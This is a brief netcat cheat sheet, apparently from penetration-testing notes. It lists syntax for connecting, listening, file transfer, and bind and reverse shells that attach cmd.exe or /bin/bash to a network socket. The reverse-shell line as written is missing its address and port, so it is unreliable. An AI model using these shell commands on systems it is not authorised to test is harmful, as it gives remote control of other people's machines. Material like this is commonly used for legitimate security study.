# Cheat Sheets

## Netcat

| Common Use Case | Syntax |
| :--- | :--- |
| Connect | `nc -nv <target ip> <port>` |
| Listen | `nc -nvlp <port>` |
| File Transfer - Receive | `nc -nvlp <port> > Recvfilename` |
| File Transfer - Send | `nc -nv <target ip> <port> < Sendfilename` |
| Bind Shell - Host | `nc -nvlp <port> -e <shell>` |
| Rev Shell - Host | `nc -nv  -e <shell>` |

{% hint style="info" %}
&lt;shell&gt; is usually cmd.exe on Windows or /bin/bash on Linux
{% endhint %}

| Command Line Arg | Purpose |
| :--- | :--- |
| -n | Skip DNS lookup |
| -v | Verbsose output |
| -l | Listener mode |
| -e | Connect program to network |
| -p | Specify port |



